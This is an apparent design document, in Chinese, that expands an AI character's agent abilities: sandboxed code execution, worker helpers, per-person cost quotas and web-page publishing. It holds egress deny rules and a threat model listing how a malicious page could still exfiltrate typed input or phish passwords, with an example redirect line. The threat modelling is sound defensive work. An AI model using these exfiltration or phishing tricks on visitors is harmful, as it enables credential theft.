# 階段 7:她是一個能做事的 agent

> 2026-11-23。owner 的回饋:「限制太多了,跟一般的 AI chatbot 差不多」「啥都不能做」;要她能做一個 agent 實際能做的事。遊戲晚點。原本排在階段 7 的 Minecraft、Neuro SDK 和等著的遊戲 PR 順延到階段 8。
>
> 這份文件是兩份唯讀盤點(她怎麼運作、她能做什麼)加上 owner 同一天的決定寫成的。

## 量到的現況

三天(2026-11-21 到 23)的模型呼叫紀錄:她呼叫工具 408 次,其中按表情 260 次、筆記本約 160 次、經濟類約 40 次、唱歌 20 次、上網 7 次;跑程式、檔案、畫圖、提醒、私訊 0 次。

原因,照影響排:

1. **一次執行是一則回覆**。文字 10 輪、120 秒,語音 2 輪、12 秒;到了上限多跑一步「說你做到哪」就結束,不能接續,沒有計畫(`brain/self/src/profiles.ts`、`run.ts`)。同一個人接著說一句有份量的話會讓這次執行重來,已經做的工具工作丟掉(`selfhost/src/lane.ts`)。
2. **背景幫手只能讀**。`delegate` 只有 research(上網、回憶、讀筆記本)和 curator(整理筆記本)兩種,輪數和預算寫死,進度她看不到,重啟就算失敗(`self/src/subagents.ts`、`delegate.ts`)。
3. **跑程式整個不見**。沙箱只有 Docker 一種後端,Core 那台沒開 Docker,所以 `code_run`、`code_session`、`workspace_run`、`workspace_save_script`、`tool_propose`、附件解析在開機時撤掉(`workspace/sandbox/src/gate.ts`)。
4. **檔案工具只有 owner 叫得動,而且要先找**。`sandbox.workspace` 只給 owner;工作區工具不在常駐清單裡,`find_tools` 的提示只提金幣、派對、唱歌、遊戲、直播(`llm/tools/src/find.ts`、`self/src/rules.ts`)。
5. **提示詞叫她短**。「一句吐槽或一聲驚呼就可以是整個回覆」、心情好就按表情、委派的說明寫「不能寫程式」(`brain/agent/src/lorebook.ts`、`self/src/delegate-texts.ts`)。
6. **沙箱很緊**。不能上網、不能裝套件、256 MiB、最長 120 秒、輸出檔合計 1 MiB、只有 Python 和 Node 的單一程式。
7. **審查看不到理由**。`slimTool` 把每個工具的 `why` 拿掉,`code_run` 的審查規則卻寫理由不清楚就拒絕(`brain/agent/src/slim.ts`、`sandbox/src/gate.ts`)。
8. **插件的工具不走閘門**,MCP 客戶端做好了但沒有設定任何伺服器,成員也叫不到。

## 原則

- **預設能做,她自己決定做不做**。加一個限制要說得出它擋的是哪一種具體的傷害。不因為「保險起見」加確認、冷卻或每日上限。
- **要擋的傷害只有這幾種**:逃出沙箱碰到主機的檔案和密鑰;連到內網、tailnet 或其他機器的管理介面;拿別人的機器去攻擊、寄信、挖礦;一個人把大家的錢或機器時間用光;看到別人的檔案。
- **owner 既有的規則不變**:隱私的退出設定、魚幣和羈絆的規則、她的內容界線、語音和 Go Live 留在 self 帳號、不給買賣建議。
- **閒聊照舊**。短、口語、可以只按表情,只在聊天時適用;有人要她做事時不適用。

## owner 的決定(2026-11-23)

| 題目 | 決定 |
|---|---|
| 誰能叫她做真正的工作 | 羈絆在「基本」以上的人。做成設定 `work_min_bond`,預設 15(朋友)。owner 一律可以。 |
| 額度 | 每人兩種:AI 額度(她為這個人花的模型費用)和工作額度(沙箱機器的時間)。一開始設很高,幾乎碰不到。 |
| 沙箱跑在哪 | Docker。做成 hostd 管的服務,可以跨機器自動分配。 |
| 沙箱的限制 | 不要限制那麼多,主要防惡意行為。 |
| k8s / k3s | 不用(見下)。 |
| 每日預算 | 先不動,上線後看實際花費。 |

### 為什麼不用 k8s 或 k3s

- 機器是朋友的 Windows 電腦,時開時關,走 tailnet 或 Cloudflare。k3s 的節點要 Linux;k8s 的 Windows 節點只跑 Windows 容器。兩者都假設節點之間網路穩定互通。
- 同一個叢集的節點拿得到叢集分派的密鑰,等於互相高度信任,不適合朋友的電腦。
- hostd 已經有需要的東西:就緒檢查、排隊、跨機器挑選、失敗換機、每台自己決定接不接(`docs/design/v5-hostd.md` §15)。
- 沙箱後端留介面(`Sandbox`、`DockerRunner`)。哪天有幾台固定的 Linux 伺服器,加一個後端就好。

## 四批

### 第一批:她能做一件事

不需要沙箱。

- **通用幫手**:`delegate` 多一種 `worker`。工具是上網三個、回憶、筆記本、工作區(列、讀、寫、刪、匯出)、`find_tools`,沙箱在的時候加 `code_run`。不能說話、不能花魚幣、不能私訊;結果回給她,由她交給人。
- **每種幫手的輪數、時間、預算是設定**:`[modules.agent.delegate.kinds.<kind>]`。`worker` 預設 60 輪、30 分鐘、1 美元。
- **計畫**:幫手有 `plan` 工具(一份步驟清單,每步待做 / 進行中 / 完成)。清單存在工作上,她和面板都看得到。
- **進度**:她的提示詞有一區「進行中的工作」:每個工作的目標、誰要的、計畫、最新一步。完成時叫醒她;有人在等的結果她要交代,不能不說。
- **重啟後接續**:沒做完的工作帶著自己的逐字稿接著跑,不再標成失敗。
- **文字執行放寬**:輪數和時間改成設定,預設 20 輪、300 秒。到上限時最後一步可以呼叫 `delegate` 把剩下的交出去。
- **做過工具的執行不重來**:接著進來的話排在後面。
- **常駐工具**加上工作區的列、讀、寫、`share`、`delegate_list`、`delegate_read`。`find_tools` 的提示補上檔案、程式、工作區、插件。
- **提示詞**:一條做事的規則(想清楚要幾步;一兩步就自己做,多步或要等的交給 `worker`;做完要交代結果);委派的說明不再寫「不能寫程式」;「短短的」只管聊天。
- **審查拿得到理由**:高風險工具保留 `why`。
- **誰能叫**:羈絆到 `work_min_bond` 的人拿到工作區和跑程式的權限。
- **工作區分人**:成員要她做的事只碰得到 `people/<那個人>/` 底下;owner 和面板看得到全部;她自己做的事(沒有人要的)看得到全部,除了 `people/`:成員有辦法讓她「自己」做事(看一眼他說的話、留在收件匣的東西),所以別人的資料夾不能是她自己的。有人要的排程和提醒記著是誰要的,時間到了替那個人做(他的資料夾、他的羈絆、他的額度)。
- **每人的 AI 額度**:她為一個人花的模型費用(回他的話、他要的工作)記在那個人身上,每小時和每天各一個上限,設定在 `[modules.agent.quota]`,預設很高。到了她說一句,不是不理人。

### 第二批:沙箱是一個服務

- **hostd 的服務 `sandbox`**:一台機器的 `host.toml` 開了它、Docker 在,才接。Core 透過叢集的 `request` 叫它,挑機器、排隊、失敗換機照 §15。`class = "job"`。
- **每台機器的主人決定**接不接成員的工作、最多同時幾個、給多少 CPU 和記憶體。預設不接。
- **裡面像一台機器**:有 shell(`shell_run`),可以裝套件,映像檔帶常用的東西(Python、Node、git、ffmpeg、常見的資料處理套件)。預設 2 CPU、2 GiB、單次 10 分鐘、工作階段 2 小時、單檔 256 MiB。全部是設定。
- **能上網**,經過出口代理。代理擋:私有位址、連結本機位址、tailnet 的網段、雲端的中繼資料位址;25 / 465 / 587 埠;每個工作的連線數和流量上限。其他都放行,不用白名單。
- **不給的**:主機的任何掛載(只有這個工作自己的資料夾)、主機的環境變數、Docker socket、特權、root。CPU 長時間滿載超過工作額度就停。
- **工作區跟著工作走**:開始時把那個人的資料夾送進去,結束時把改動收回來。機器之間不共用磁碟。
- **附件進得去**:訊息裡的檔案放進工作的資料夾。**結果出得來**:`share` 的種類放寬(文件、試算表、網頁、壓縮檔),大小上限跟著平台的附件上限;超過的給下載連結(要先設檔案網域)。
- **每人的工作額度**:沙箱的 CPU 秒數,每小時和每天,預設很高。
- **跑程式的風險等級**:在沙箱裡跑是中風險,不再每次過審查。把東西存成之後會自動跑的腳本或工具仍然要審查。

### 第三批:補齊工具

- 檔案的局部修改(`workspace_edit`)和搜尋(`workspace_grep`)。
- 真的瀏覽器(沙箱裡的 Playwright):`browse_open`、`browse_act`、`browse_read`、截圖給她看。
- 畫圖:`image_make` 接到 imagegen(ComfyUI)。
- 排程能起一個工作,不只是叫醒她。

### 第四批:插件

- 插件登記的工具走同一個閘門:宣告風險等級,有頻率上限、稽核、`on_own`。
- 插件的程序放進沙箱服務跑,不再是主機上的一般程序。
- MCP:`[mcp.servers.*]` 的工具給到 `work_min_bond` 的人;插件清單裡附的 MCP 伺服器真的接上。
- 宣告式的 HTTP 工具:一個 toml 寫網址、參數、密鑰從哪來,就是一個工具。
- 插件可以有排程和背景工作。
- `miyoria ext new` 的範本做到「十幾行就多一個能力」。

## 上限收成三種

> 2026-11-23。owner 問上限是不是太多、有沒有重疊:有。一個人的一個要求原本要過十來層(每次執行的輪數、每步幾個工具、時間、每個工具的時間、token;每個對話每小時的美元和 token;每天的美元;小幫手同時幾個、排隊、每天的美元和 token、每種的輪數 / 分鐘 / 美元 / token;閘門的層級;每人每 10 分鐘的上網次數……)。上限只為四件事:錢、洗版、一個人濫用她、停不下來的迴圈。owner 同意每件事只留一個地方管,而且每人有一份 AI 額度,一開始設很高。

收成三種:**錢**(每天的預算和每人的 AI 額度)、**一次做事的長度**(擋停不下來的迴圈)、**她往外碰到人的動作**(洗版和打擾人,原本就在閘門和 Floor)。

### 每人的 AI 額度

- `[modules.agent.quota]`:`person_usd_per_hour`(預設 3)、`person_usd_per_day`(預設 10),0 = 不設;`unpriced_usd_per_mtok`(預設 1):沒有價目的模型每一百萬 token 算多少美元,所以到處都只有一個單位,美元。
- **算誰的**:回一個人的執行(文字和語音)算在那個人身上;一次回好幾個人時,每一步平分給他們,工具替誰叫的模型算那個人的,替已經到額度的人做的工具呼叫不做;他要的小幫手工作算在他身上(工作替他做事,執行的 turn 是 `delegate-<id>`);執行裡的工具替他叫的模型(例如 `watch_look` 看直播畫面)也算他的。她自己主動的事(看一眼、提醒、反思、她自己開的工作)不算在任何人身上,只受每天的預算管。owner 會記帳,但不受限。
- **記在哪**:store 的 `quota` 外掛,表 `quota_spend`(人、`minute` 或 `day`、鍵、微美元),重啟不會歸零;每小時清一次一小時前的分鐘和昨天以前的日子。一小時是滾動的(以分鐘為單位),一天是她的當地日(`[modules.arbiter]` 的換日時間)。人是 person id,不認識的人用帳號(`platform:id`)。
- **到了**:那個人的執行在呼叫任何模型之前停下,她說一句固定的話,同一段時間只說一次,不叫模型:「你這個小時找我做的事有點多,大概 N 分鐘後再來。」或「你今天找我做的事有點多了,大概 N 個小時後再來。」(一小時以內說分鐘)。執行做到一半到了,就是最後一步(不能再交給小幫手)。他要開小幫手,`delegate` 當場拒絕,給她一句可以轉述的理由;做到一半的工作做完這一步就交代結果(`out_of_budget`,附註寫是額度到了)。
- **看得到**:`GET /api/llm/quota`(管理端:上限,和今天有花到的每個人這小時、今天用了多少、到了哪一個);會員頁 `GET /api/member/me` 多一欄 `quota`(自己用了多少和上限)。面板還沒有畫面。

### 拿掉或改掉的設定

舊的 `miyoria.toml` 照樣開得起來,這些鍵在開機時列在「config keys no longer read, ignored」那一行警告裡(`packages/core/src/removed-config.ts`)。

| 設定 | 原本管什麼 | 現在由誰管 |
|---|---|---|
| `[modules.agent] session_usd_per_hour` | 一個對話一小時花多少(錢、一個人洗一個頻道) | 每人的 AI 額度;一個頻道裡別人照樣有人回 |
| `[modules.agent] session_tokens_per_hour` | 同上,模型沒價目時用 token 算 | AI 額度,沒價目的照 `unpriced_usd_per_mtok` 換成美元 |
| `[modules.agent] text_tokens` | 一次文字執行的 token | 每個執行種類固定的 token 天花板(程式裡,不是設定),只擋壞掉的迴圈;錢由額度管 |
| `[modules.agent] text_calls_per_round` | 一步最多幾個工具 | 固定 8 個(程式裡) |
| `[modules.agent.delegate] daily_usd` | 所有小幫手一天花多少 | 每天的預算 `[llm.budget] daily_usd`,加上要工作的人的額度 |
| `[modules.agent.delegate] daily_tokens` | 同上,用 token 算 | 同上 |
| `[modules.agent.delegate] reflect_daily_tokens` | 反思一天的 token | `reflect_daily_usd`(沒價目的換成美元) |
| `[modules.agent.delegate.kinds.*] calls_per_round` | 每種小幫手一步幾個工具 | 固定 8 個 |
| `[modules.agent.delegate.kinds.*] tokens` | 每種小幫手一件工作的 token | 每種固定的 token 天花板(程式裡);錢由 `usd_default` / `usd_max` 和額度管 |
| `[modules.web] search_per_person`、`read_per_person`、`image_per_person`、`window_s` | 每人每 10 分鐘查、讀、看圖幾次 | 只留 `search_per_person_hour`(預設 60):搜尋可能花付費服務的點數;讀網頁和看圖由一次做事的步數和額度管 |
| `[modules.web] search_global`、`read_global`、`image_global` | 所有人每 10 分鐘加起來幾次 | 拿掉;DuckDuckGo 的間隔和冷卻照舊擋 |
| `[modules.web] search_per_job`、`read_per_job`、`image_per_job` | 一件小幫手工作自己的上網次數 | 拿掉;工作的搜尋算在要它的人的每小時次數裡 |

### 留下的,各管一件事

- `[llm.budget] daily_usd`:錢,所有東西加起來一天。
- `[modules.agent.quota]`:錢,一個人。也擋一個人把她占住。
- `[modules.agent] text_rounds`、`text_seconds`、`text_tool_seconds`,語音和各種小幫手的輪數、分鐘、`tool_seconds`,每個執行固定的 token 天花板:停不下來的迴圈。
- `[modules.agent.delegate.kinds.*] usd_default`、`usd_max`:一件工作的大小,由她挑,不是對人的上限。
- `[modules.agent.delegate] max_running`、`max_queued`:同時有多少件工作在跑(機器和模型的並行),不是錢。
- `[modules.agent.delegate] reflect_daily_usd`:每晚的反思,一晚不能把隔天的預算吃光。
- `[modules.web] search_per_person_hour`:付費搜尋的點數。DuckDuckGo 的 `ddg_gap_ms`、`ddg_cooldown_s` 和網路安全檢查:保護服務和內網,不是額度。
- 她自己多常開口(看一眼的次數、Floor)、閘門對往外碰到人的動作(私訊、發文、分享)和同意的規則:洗版和打擾人。
- 沙箱的資源上限、經濟 / 交易所 / 卡拉 OK / 卡片的數字(遊戲平衡)、watch 的 `looks_per_hour`、隱私的退出設定:各自原本的用途,不動。

還沒收的、留在 backlog:工作線的 `[modules.agent.work] daily_tokens`(只剩遊戲導演用,跟工作線一起拿掉)、`[modules.reflect.tidy] budget_tokens`、沙箱附件的 `per_person` / `global`。

## 她能發網頁

> 2026-11-23。一個成員要她做網頁:她寫了 `miyoria.html`、匯出、用 `share` 傳到頻道(會執行的檔案在私訊以外照樣當 `.txt` 傳)。對方要「放在檔案網域上」,連結被拒(`type_not_allowed`:網頁原始檔不做下載連結),但她的結果沒說原因,她就說檔案網域「沒開」,其實有開。owner 的方向:預設能做,限制要說得出擋的是哪種傷害。

- **結果說實話**:`share` 傳了附件但沒附連結時,結果多一句可以轉述的原因(檔案網域沒設定、沒開登入、網頁原始檔不做下載連結而要用 `page_publish`、會執行的檔案、密鑰檢查、今天的額度、範圍太大),`data.link_refused` 是代碼;附件傳不出去、連結也做不了時兩個原因都說。
- **工具**:`page_publish`(文字執行常駐)、`page_list`、`page_unpublish`(`find_tools` 找得到,`files` 類)。另開工具、不是 `share` 的模式:`share` 在對話裡傳一個檔案,連結是下載;網頁不貼訊息、要在瀏覽器裡顯示,有自己的標頭、橫幅、用相對路徑載入的檔案、幾週的壽命,還要能列出和收回。誰能叫照工作的規則:閘門的 `permit`(`sandbox.workspace`,或羈絆到 `work_min_bond`);每個檔案都要是開口的人自己的產物(他的資料夾匯出的),在這裡看得到;owner 不受「自己的」限制,`page_list` 和 `page_unpublish` 也看得到全部。
- **網址**:`https://<files origin>/p/<代號>/`,代號是 128 位元的亂數。網頁用到的檔案在同一層底下(`/p/<代號>/style.css`、`/p/<代號>/img/cat.png`):她把每個檔案各自 `workspace_export`,再在 `assets` 裡寫 `{path, artifact}`。只給本人或伺服器成員的網頁先送到會員網站 `/api/member/files/page/<代號>` 登入,再回到 `/p/<代號>/~<票>/`:票放在路徑裡,網頁載入的檔案也帶著它;票只開這一頁、這個人,30 分鐘。
- **能放的**:網頁本身是 HTML 文字(`.html` / `.htm`,或內容是 HTML);檔案可以是 `.html`(另一頁,也有橫幅)、`.css`、`.js` / `.mjs`、`.json`、`.txt`、`.md`、`.csv`、圖片(送出的是清掉資料的副本)、音訊、影片。PDF、壓縮檔、Office、SVG 檔案不能當網頁的檔案。字型產物庫不收(要加 woff / woff2 / ttf / otf 的型別判斷),用 CSS 裡的 `data:` 就好。
- **要擋的傷害,只有這些**:
  1. 碰到面板或我們的東西:只在檔案網域(不是面板的主機),那裡沒有 cookie;每個回應都是 `Content-Security-Policy` 的 `sandbox allow-scripts allow-popups allow-modals allow-pointer-lock`(沒有 `allow-same-origin`、`allow-forms`、`allow-top-navigation`),網頁跑在自己的不透明來源,讀不到這個主機的其他網頁和檔案;`X-Frame-Options: DENY`、`frame-ancestors 'none'`。
  2. 在 owner 的網域上釣魚、偷資料:`default-src 'none'`、`script-src 'unsafe-inline' <本頁>`、`style-src 'unsafe-inline' <本頁>`、`img-src` 和 `media-src` 是 `<本頁> data: blob:`、`font-src <本頁> data:`、`connect-src 'none'`、`form-action 'none'`、`frame-src 'none'`、`child-src` / `worker-src` / `object-src` / `manifest-src 'none'`、`base-uri 'none'`;`<本頁>` 是 `https://<files origin>/p/<代號>/`,別的網頁的檔案也載不到。`<a href>` 的外部連結點了照樣會開,這是要的。伺服器在每頁 `<body>` 的第一個位置放一條固定在最上面的橫幅(行內樣式加 `!important`、每次不同的 id),中英文寫「這是成員請她幫忙做的,不是官方網站,不要在這裡輸入任何密碼」。
  3. 誰打得開:跟連結一樣,本人(`to` speaker)或伺服器成員(`here`)登入後;`[modules.api.files] pages_public = true` 時才可以 `anyone`(不用登入,而且只限開口的人自己的東西)。
  4. 空間和流量:網頁和連結一起算 `links_per_person_per_day`,也算 `share` 每天的次數;HTML 最大 `page_max_kb`(預設 2048)、加上檔案合計 `page_total_max_kb`(預設 8192);`page_days` 天後下架(預設 30,最多 `page_max_days`,預設 90),網頁用到的產物延長到同一天;`page_unpublish` 馬上失效。HTML 和每個文字檔發之前、送出時都過密鑰檢查。
  5. 搜尋引擎:`X-Robots-Tag: noindex, nofollow`。
  另外每個回應都有 `X-Content-Type-Options: nosniff`、`Referrer-Policy: no-referrer`、`Cross-Origin-Resource-Policy: same-site`、`Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()`。只有 `/p/` 會回 `text/html`;`/f/` 的連結和 `/d/` 的下載從來不會。
- **惡意網頁還做得到的**:
  - 用程式讀訪客打的字,再讓自己換頁(`location = "https://別處/?q=..."`)或開新視窗(`allow-popups`)把資料放在網址裡帶走:CSP 擋不了頁面自己換頁(`navigate-to` 已經從標準拿掉)。表單送不出去、連不了線,但假的登入頁還是能這樣偷到密碼;能擋的只剩橫幅。
  - 用程式拿掉橫幅,或疊一個東西蓋住它。
  - 誤導人的內容、指向別處的釣魚或惡意下載的連結(要人點)。
  - 吃訪客的 CPU 和記憶體、一直跳對話框、鎖滑鼠。
  - 只給特定的人的網頁,網址裡的票網頁的程式讀得到,帶出去的話別人 30 分鐘內也打得開這一頁(就是這一頁本身)。
  - 不支援 CSP `sandbox` 標頭的很舊的瀏覽器會把網頁當成檔案網域本身來跑;那裡沒有 cookie,能碰到的只有同一個網域上別的網頁和檔案。
- **資料庫**:`artifact` 外掛的第 2 個 migration `pages`,只新增 `artifact_pages`、`artifact_page_assets` 兩張表和三個索引,不動舊表。

## 不做的

- 讓她直接在主機上跑指令(沒有沙箱的 shell)。
- 讓成員的工作碰到別人的檔案、她的記憶資料庫、設定檔。
- k8s。
- 遊戲(階段 8)。

## 怎麼知道有用

- 上線後每週看同一份統計:工具呼叫裡按表情和筆記本以外的比例、`delegate` 的次數和完成率、每人和每天的花費。
- 一組固定的任務當評測(查資料寫摘要、整理一份 CSV、寫一個小程式並跑出結果、把一段文字做成檔案交給人),每批上線前後各跑一次。
